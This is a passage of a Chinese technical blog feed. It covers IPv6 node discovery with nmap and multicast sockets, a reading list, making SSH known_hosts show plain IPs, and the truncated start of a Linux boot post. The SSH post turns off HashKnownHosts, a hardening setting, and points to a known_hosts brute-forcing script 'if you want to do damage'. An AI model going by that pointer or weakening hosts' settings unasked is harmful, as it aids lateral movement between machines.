它通常用来评估网络系统安全。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:/tmp/nnn</span><br><span class="line"><span class="meta"> $</span><span class="bash"> nmap -6 <span class="string">"--script=targets-ipv6-multicast-*"</span> | head -n 10</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.40 ( http://nmap.org ) at 2019-12-12 07:22 CST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| targets-ipv6-multicast-echo:</span><br><span class="line">|   IP: fe80::e4a5:4fff:fea7:79af  MAC: e6:a5:4f:a7:79:af  IFACE: eth0</span><br><span class="line">|   IP: fe80::250:56ff:fe85:647e   MAC: 00:50:56:85:64:7e  IFACE: eth0</span><br><span class="line">|   IP: fe80::250:56ff:fe9e:2473   MAC: 00:50:56:9e:24:73  IFACE: eth0</span><br><span class="line">|   IP: fe80::ae53:a418:ca0:83e8   MAC: 00:50:56:9f:43:ca  IFACE: eth0</span><br><span class="line">|   IP: fe80::250:56ff:fe9e:bcb6   MAC: 00:50:56:9e:bc:b6  IFACE: eth0</span><br><span class="line">|   IP: fe80::250:56ff:fe9f:6153   MAC: 00:50:56:9f:61:53  IFACE: eth0</span><br><span class="line">WARNING: No targets were specified, so 0 hosts scanned.</span><br></pre></td></tr></table></figure><h2 id="更进一步"><a href="#更进一步" class="headerlink" title="更进一步"></a>更进一步</h2><p>往往我们的需求不只是获取到 IP 这么简单，我们现在更进一步，我们要求扫描的结果中与我们预期的版本相同，那么此时就需要与对应节点进行通信了。</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>一个比较简单的实现，就是在目标节点开机的时候自动启动一个 API server，提供一个 Entrypoint，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/api/v1/version')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">"version"</span>:<span class="string">"v1.0.0"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'::'</span>, port=<span class="number">5000</span>, debug=<span class="keyword">True</span>) <span class="comment"># 要兼容 IPv6</span></span><br></pre></td></tr></table></figure><p>然后我们可以在得到 IPv6 地址后，通过 curl 或者 Python urllib2 来发送对应的请求：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:/tmp/nnn</span><br><span class="line"><span class="meta"> $</span><span class="bash"> curl -g -6 <span class="string">'http://fe80::5054:ff:fe80:95d9%eth0:5000/api/v1/version'</span></span></span><br><span class="line">&#123;</span><br><span class="line">  "version": "v1.0.0"</span><br><span class="line">&#125;#</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res = urllib2.urlopen(<span class="string">"http://fe80::5054:ff:fe80:95d9%eth0:5000/api/v1/version"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.read()</span><br><span class="line"><span class="string">'&#123;\n  "version": "v1.0.0"\n&#125;'</span></span><br></pre></td></tr></table></figure><p>这样虽然可以达到我们想要的效果，但是效率太低了，要先后进行2次操作，一次是扫描对应的 IPv6 地址，一次是得到地址后进行 HTTP 请求。</p><h3 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h3><p>我们可以通过 socket 通信来达到类似的效果，与 HTTP 不同的是，我们可以直接使用 socket 发送组播，来进行消息传递，这样上面的两步就可以通过一步来解决了，这里给出对应的 server 和 client 代码示例：</p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        s.bind((<span class="string">''</span>, <span class="number">30000</span>))</span><br><span class="line">        s.setblocking(<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            rlist, _, _ = select.select([s], [], [s], <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> rlist:</span><br><span class="line">                string, address = s.recvfrom(<span class="number">20000</span>)</span><br><span class="line">                <span class="keyword">print</span> string, address</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data = json.loads(string)</span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                owner = data.get(<span class="string">"owner"</span>)</span><br><span class="line">                <span class="keyword">if</span> owner == <span class="string">"yiran"</span>:</span><br><span class="line">                    info = &#123;<span class="string">"version"</span>: <span class="string">"v1.0"</span>,</span><br><span class="line">                            <span class="string">"owner"</span>: <span class="string">"yiran"</span>,</span><br><span class="line">                            <span class="string">"nic"</span>: address[<span class="number">0</span>].split(<span class="string">"%"</span>, <span class="number">1</span>)[<span class="number">1</span>]&#125;</span><br><span class="line">                    s.sendto(json.dumps(info), address)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    server()</span><br></pre></td></tr></table></figure><h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">()</span>:</span></span><br><span class="line">    s= socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, <span class="number">5000000</span>)</span><br><span class="line">    nics = socket.getaddrinfo(<span class="string">"%s%%%s"</span> % (<span class="string">'ff02::1'</span>, <span class="string">'eth0'</span>), <span class="number">30000</span>, socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">    data = &#123;<span class="string">"owner"</span>: <span class="string">"yiran"</span>&#125;</span><br><span class="line">    string = json.dumps(data)</span><br><span class="line">    results = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> nic <span class="keyword">in</span> nics:</span><br><span class="line">            _, _, _, _, address = nic</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s.sendto(string, address)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        rlist, _, _ = select.select([s], [], [s], <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> rlist:</span><br><span class="line">            json_string, address = s.recvfrom(<span class="number">10000</span>)</span><br><span class="line">            results[address] = json_string</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    ips = []</span><br><span class="line">    <span class="keyword">for</span> address, json_test <span class="keyword">in</span> results.iteritems():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(json_test)</span><br><span class="line">            <span class="keyword">if</span> data.get(<span class="string">"version"</span>, <span class="keyword">None</span>) == <span class="string">"v1.0"</span>:</span><br><span class="line">                info = &#123;&#125;</span><br><span class="line">                info[<span class="string">'ipv6_address'</span>] = address[<span class="number">0</span>]</span><br><span class="line">                info[<span class="string">'test'</span>] = data</span><br><span class="line"></span><br><span class="line">                ips.append(info)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ips</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pprint(client())</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.ruijie.com.cn/fa/xw-hlw/83116/" target="_blank" rel="noopener">http://www.ruijie.com.cn/fa/xw-hlw/83116/</a></li><li><a href="https://tools.ietf.org/html/rfc4861" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc4861</a></li><li><a href="https://security.stackexchange.com/questions/12826/which-tool-apart-from-nmap-can-i-use-to-scan-a-range-of-ipv6-addresses" target="_blank" rel="noopener">https://security.stackexchange.com/questions/12826/which-tool-apart-from-nmap-can-i-use-to-scan-a-range-of-ipv6-addresses</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在做节点管理时，经常面临节点自动扫描，自动关联等功能，这时候需要 NDP 来帮助我们来完成，关于 NDP 的实现有几种方式，今天来聊一下这个
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
      <category term="Network" scheme="https://zdyxry.github.io/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>2019年读书记录</title>
    <link href="https://zdyxry.github.io/2019/12/09/2019%E5%B9%B4%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%95/"/>
    <id>https://zdyxry.github.io/2019/12/09/2019年读书记录/</id>
    <published>2019-12-09T12:07:34.000Z</published>
    <updated>2019-12-13T12:23:56.128Z</updated>
    
    <content type="html"><![CDATA[<h2 id="年终总结"><a href="#年终总结" class="headerlink" title="年终总结"></a>年终总结</h2><ul><li><a href="https://zdyxry.github.io/2016/12/31/2016%E5%B9%B4%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%95/">2016</a><ul><li>计划读 5 本，实际读 13 本。</li></ul></li><li><a href="https://zdyxry.github.io/2017/12/31/2017%E5%B9%B4%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%95/">2017</a><ul><li>计划 32 本，实际读完 23 本。</li></ul></li><li><a href="https://zdyxry.github.io/2018/12/30/2018%E5%B9%B4%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%95/">2018</a><ul><li>计划 30 本，实际25本。</li></ul></li><li>2019<ul><li>计划 30 本，实际 43 本。</li></ul></li></ul><p>今年是第 4 年写读书记录了，感觉手上这本 TLPI 年底之前是看不完了，就总结一下。与之前不同的是今年把周末的时间利用的比较好，通常周末两天会拿出一整天的时间来看书，保证自己的精力集中，效率会高很多。</p><p>因为博客集成了豆瓣，所以就不列出 <code>在读</code> 和 <code>想读</code> 列表了，想的太多，耽误事。希望接下来读一些经典的技术书，把自己的基础知识补齐。</p><h2 id="已读"><a href="#已读" class="headerlink" title="已读"></a>已读</h2><ol><li>《用Python写网络爬虫》  </li><li>《Wireshark网络分析就这么简单》  </li><li>《如何有效阅读一本书 : 超实用笔记读书法》</li><li>《冷场》  </li><li>《Go程序设计语言》  </li><li>《爱你就像爱生命》  </li><li>《Go by Example》</li><li>《显微镜下的大明》</li><li>《流浪地球》</li><li>《情感勒索》</li><li>《Go语言实战》</li><li>《活着》</li><li>《悉达多》</li><li>《Go in Practice》</li><li>《奈飞文化手册》  </li><li>《刻意练习》  </li><li>《软件测试的艺术》  </li><li>《Redis实战》  </li><li>《雪崩》  </li><li>《TCP/IP详解 卷1：协议》</li><li>《Structure and Interpretation of Computer Programs - 2nd Edition (MIT)》</li><li>《编码的奥秘》</li><li>《Kubernetes in Action》</li><li>《计算机组成：结构化方法》</li><li>《人月神话》</li><li>《自己动手写Docker》</li><li>《好文案一句话就够了》</li><li>《跟老男孩学Linux运维：Web集群实战》</li><li>《计算机组成与设计》</li><li>《简约至上》</li><li>《Go Web编程》</li><li>《大话数据结构》</li><li>《Python Web开发实战》</li><li>《Programming Kubernetes》</li><li>《Istio入门与实战》</li><li>《刷新》</li><li>《奇特的一生》</li><li>《图解密码技术（第3版）》</li><li>《细节》</li><li>《生活大爆炸里的科学》</li><li>《操作系统导论》</li><li>《RESTful Web APIs中文版》</li><li>《正则表达式必知必会》</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;年终总结&quot;&gt;&lt;a href=&quot;#年终总结&quot; class=&quot;headerlink&quot; title=&quot;年终总结&quot;&gt;&lt;/a&gt;年终总结&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://zdyxry.github.io/2016/12/31/2016%E5%B9%
      
    
    </summary>
    
    
      <category term="Book" scheme="https://zdyxry.github.io/tags/Book/"/>
    
  </entry>
  
  <entry>
    <title>SSH known_hosts 显示 IP 地址</title>
    <link href="https://zdyxry.github.io/2019/12/06/SSH-known-hosts-%E6%98%BE%E7%A4%BA-IP-%E5%9C%B0%E5%9D%80/"/>
    <id>https://zdyxry.github.io/2019/12/06/SSH-known-hosts-显示-IP-地址/</id>
    <published>2019-12-06T13:54:25.000Z</published>
    <updated>2019-12-06T15:11:12.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>工作上使用的电脑因为各种各样的原因，被我安装为 Ubuntu 19.04，平时使用上没什么问题，但是最近发现它默认的 SSH 配置随着版本升级发生了变化，known_hosts 文件中记录的不再是 IP 地址，而是一串字符，这导致了当我想要删除某个主机的 key 时，无法准确的找到，因此想办法解决这个事情。</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>我们使用 Linux 系统的一个最基本的服务应该就是 SSH 了，除了偶尔我们通过 VNC 或者 KVM(Keyboard Virtual Manager)连接控制主机外，都是通过 SSH 到 Linux 主机上进行某些操作。那么 SSH 就是 Secure Shell，安全外壳协议。可在不安全的网络中为网络服务提供安全的传输环境。SSH 通过在网络中建立安全隧道来实现SSH客户端与服务器之间的连接。</p><p>SSH 最重要的就是安全，采用的是非对称加密，关于加密相关的部分，可以看我之前写的一篇<a href="https://zdyxry.github.io/2019/09/14/%E3%80%8A%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">《图解密码技术》读书笔记</a> 里面有比较完整的相关知识。</p><p>这里主要说一下使用密码登陆和密钥登陆的流程。</p><h3 id="密码登陆"><a href="#密码登陆" class="headerlink" title="密码登陆"></a>密码登陆</h3><ol><li>客户端向服务端发起连接请求</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@test-hostname-ubuntu-s-1804:~# ssh 192.168.67.90</span><br><span class="line">The authenticity of host '192.168.67.90 (192.168.67.90)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ca9Zk/7pR4f6rrNP3wi1WK+CQMtG4Ka+kkouwQYU0nY.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure><ol start="2"><li>客户端会提示，知道服务端的唯一标示，确认连接么</li><li>确认连接，输入 yes</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@test-hostname-ubuntu-s-1804:~# ssh 192.168.67.90</span><br><span class="line">The authenticity of host '192.168.67.90 (192.168.67.90)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ca9Zk/7pR4f6rrNP3wi1WK+CQMtG4Ka+kkouwQYU0nY.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added '192.168.67.90' (ECDSA) to the list of known hosts.</span><br><span class="line">root@192.168.67.90's password:</span><br></pre></td></tr></table></figure><ol start="4"><li>服务端传输公钥给客户端，客户端输入密码，使用服务端公钥加密并发送给服务端</li><li>服务端使用私钥解密，验证密码正确，登陆成功</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@test-hostname-ubuntu-s-1804:~# ssh 192.168.67.90</span><br><span class="line">The authenticity of host '192.168.67.90 (192.168.67.90)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ca9Zk/7pR4f6rrNP3wi1WK+CQMtG4Ka+kkouwQYU0nY.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added '192.168.67.90' (ECDSA) to the list of known hosts.</span><br><span class="line">root@192.168.67.90's password:</span><br><span class="line">Last login: Fri Dec  6 21:51:00 2019 from 192.168.73.54</span><br><span class="line">[root@node90 22:30:29 ~]$</span><br></pre></td></tr></table></figure><h3 id="密钥登陆"><a href="#密钥登陆" class="headerlink" title="密钥登陆"></a>密钥登陆</h3><ol><li>客户端向服务端发起连接请求</li><li>服务端收到客户端的请求，找到对应客户端的公钥，生成随机数</li><li>服务端使用客户端的公钥对随机数进行加密，发送给客户端</li><li>客户端使用私钥进行解密，得到随机数，并将随机数与 session key 拼接，并将结果通过 MD5 算出散列值</li><li>服务端同样使用随机数与 session key 拼接，并将结果通过 MD5 算出散列值</li><li>服务端对两个散列值进行校验，如果想通，则登陆成功</li></ol><h2 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h2><h3 id="ssh-id-rsa"><a href="#ssh-id-rsa" class="headerlink" title="~/.ssh/id_rsa"></a>~/.ssh/id_rsa</h3><p>当前节点生成的私钥，使用 RSA 算法。</p><h3 id="ssh-id-rsa-pub"><a href="#ssh-id-rsa-pub" class="headerlink" title="~/.ssh/id_rsa.pub"></a>~/.ssh/id_rsa.pub</h3><p>当前节点生成的公钥，使用 RSA 算法，与 id_rsa 成对出现。</p><h3 id="ssh-authorized-keys"><a href="#ssh-authorized-keys" class="headerlink" title="~/.ssh/authorized_keys"></a>~/.ssh/authorized_keys</h3><p>用于保存已经授权（信任）的客户端公钥。</p><h3 id="ssh-known-hosts"><a href="#ssh-known-hosts" class="headerlink" title="~/.ssh/known_hosts"></a>~/.ssh/known_hosts</h3><p>known_hosts 中存放 SSH 自动维护并检查的一个数据库，该数据库包含曾经连接过的所有主机的标识。</p><p>这个文件也是今天的主角。</p><h2 id="known-hosts"><a href="#known-hosts" class="headerlink" title="known_hosts"></a>known_hosts</h2><p>当我们客户端尝试连接服务端，会有一条提示，服务端主机的唯一标示是xxx，确认连接么，如果输入yes，那么这个主机的标示就会记录到 known_hosts，一般我们的 known_hosts 会长这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test-hostname-ubuntu-s-1804:~# cat .ssh/known_hosts</span><br><span class="line">|1|+YgY28AEikbKxdosHK1Cxb6zJqs=|yEi41f2MIl6hU9uQOvXyzK0hByM= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHJscGQ4nUV7b7+nUtHVFPgm38JrUJwMapVqkq+oF1RR7mniCGhrkIGpb2cqKINrcZFyKFRqWhuAgYtMyFALOrM=</span><br></pre></td></tr></table></figure><p>或者长这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:~</span><br><span class="line">   head -n 1 .ssh/known_hosts</span><br><span class="line">192.168.70.250 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHNWt8CDe7sPvATsqx5zH5v9wJzYrFhu9fmYnshIYLEnuoXmCmVu2cGU8s/IjK2jU8hnFad4T1gMhst7cXLmqAo=</span><br></pre></td></tr></table></figure><p>了解 https 相关知识的同学应该知道，证书的重要性。在 SSH 场景下，我们没有证书，那么就需要我们自己人为的确保我们要连接的服务端是可信的。如果我们第一次登陆 192.168.1.1 后，系统保存了主机唯一标示到了 ~/.ssh/known_hosts，如果我们下一次登陆 192.168.1.1 客户端发现主机唯一标示产生了变化，那么就会禁止我们登陆了。</p><p>在工作中经常遇到这种场景，可能的原因有很多：系统重装、快照回滚、IP 冲突等等。通常我们的做法就是闭着眼睛删除 known_hosts 里面的对应主机信息，然后重新登陆就可以了。</p><p>但是最近发现 Ubuntu 19.04 中记录的 known_hosts 是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test-hostname-ubuntu-s-1804:~# cat .ssh/known_hosts</span><br><span class="line">|1|+YgY28AEikbKxdosHK1Cxb6zJqs=|yEi41f2MIl6hU9uQOvXyzK0hByM= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHJscGQ4nUV7b7+nUtHVFPgm38JrUJwMapVqkq+oF1RR7mniCGhrkIGpb2cqKINrcZFyKFRqWhuAgYtMyFALOrM=</span><br></pre></td></tr></table></figure><p>是的，我们无法在一堆看似乱码中找到我们想要的主机并删掉它，这其实是 OpenSSH 新版本中的一项安全改进。</p><p>在 <a href="https://zdyxry.github.io/2019/10/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%B3%BB%E7%BB%9F%E8%A2%AB%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/">记一次系统被入侵分析过程</a> 博客中有提到，现在好多病毒在入侵之后都是通过 SSH 相关信息进行横向扩散的，所以我们应该尽可能的少在系统中保存明文的 IP 地址相关信息。</p><p>但是对我测试环境来说，是没什么关系的，因此我需要禁止这个安全配置，来达到我的目的。</p><p>正确的姿势是修改 SSH 客户端的配置，将 <code>HashKnownHosts</code> 置为 no ，清空 known_hosts 文件，再连接服务端，就可以看到 known_hosts 已经显示 IP 地址了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@test-hostname-ubuntu-s-1804:~# cat /etc/ssh/ssh_config |grep -i hash</span><br><span class="line">    HashKnownHosts no</span><br><span class="line">root@test-hostname-ubuntu-s-1804:~# cat .ssh/known_hosts</span><br><span class="line">192.168.67.90 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHJscGQ4nUV7b7+nUtHVFPgm38JrUJwMapVqkq+oF1RR7mniCGhrkIGpb2cqKINrcZFyKFRqWhuAgYtMyFALOrM=</span><br></pre></td></tr></table></figure><p>当然如果你想搞破坏，可以尝试下这篇<a href="https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/" target="_blank" rel="noopener">博客</a>中提供的脚本：<a href="https://blog.rootshell.be/wp-content/uploads/2010/11/known_hosts_bruteforcer.pl.txt" target="_blank" rel="noopener">https://blog.rootshell.be/wp-content/uploads/2010/11/known_hosts_bruteforcer.pl.txt</a> （谨慎使用）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://zh.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Secure_Shell</a></li><li><a href="https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/" target="_blank" rel="noopener">https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/</a></li><li><a href="https://unix.stackexchange.com/questions/31549/is-it-possible-to-find-out-the-hosts-in-the-known-hosts-file" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/31549/is-it-possible-to-find-out-the-hosts-in-the-known-hosts-file</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;工作上使用的电脑因为各种各样的原因，被我安装为 Ubuntu 19.04，平时使用上没什么问题，但是最近发现它默认的 SSH 配置随着版本升
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 引导那些事儿</title>
    <link href="https://zdyxry.github.io/2019/12/01/Linux-%E5%BC%95%E5%AF%BC%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
    <id>https://zdyxry.github.io/2019/12/01/Linux-引导那些事儿/</id>
    <published>2019-11-30T16:32:26.000Z</published>
    <updated>2019-11-30T16:32:49.552Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在平时工作中我自己可能80% 的时间都在使用 Linux 进行工作，无论是软件开发还是环境维护，那么对于 Linux 发行版自然也是有比较熟悉的，比如 RHEL 系列。平时大家可能多多少少都会听到或接触到一些命令（术语），比如：grub,chroot,isolinux,bios 等等。今天打算就用 CentOS 发行版的 ISO 来谈谈自己对于 Linux 系统引导，安装，启动的理解。</p><p>CentOS ISO 目录树如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── CentOS_BuildTag</span><br><span class="line">├── EFI</span><br><span class="line">├── EULA</span><br><span class="line">├── GPL</span><br><span class="line">├── images</span><br><span class="line">├── isolinux</span><br><span class="line">├── LiveOS</span><br><span class="line">├── Packages</span><br><span class="line">├── 